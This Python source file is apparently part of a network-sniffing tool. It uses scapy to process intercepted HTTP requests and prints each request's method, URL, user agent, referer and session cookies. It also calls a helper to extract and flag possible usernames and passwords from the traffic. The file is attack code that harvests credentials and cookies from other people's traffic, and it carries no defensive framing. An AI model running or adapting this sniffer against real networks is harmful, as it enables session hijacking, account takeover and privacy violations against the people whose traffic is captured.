#!/usr/bin/env python

from scapy.layers import http

from modules import get_url
from modules import dt
from modules import colors
from modules import get_login_info

requests = 0

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url.get_url(packet)
        print("[+] " + dt.dt() +
            " HTTP Request >> Method : " +
            colors.color.BOLD +
            packet[http.HTTPRequest].Method.decode("utf-8") +
            colors.color.END +
            " >> HTTP Version : " +
            packet[http.HTTPRequest].Http_Version.decode("utf-8"))
        print("    URL : " + colors.color.BOLD + url.decode("utf-8") + colors.color.END)
        print("    UserAgent : " + packet[http.HTTPRequest].User_Agent.decode("utf-8") if packet[http.HTTPRequest].User_Agent else "    UserAgent : None")
        print("    Referer : " + packet[http.HTTPRequest].Referer.decode("utf-8") if packet[http.HTTPRequest].Referer else "    Referer : None")
        print("    Cookie : " + packet[http.HTTPRequest].Cookie.decode("utf-8") + "\n" if packet[http.HTTPRequest].Cookie else "    Cookie : None" + "\n")

        login_info = get_login_info.get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/pass > " + login_info + "\n\n")

        global requests
        requests += 1
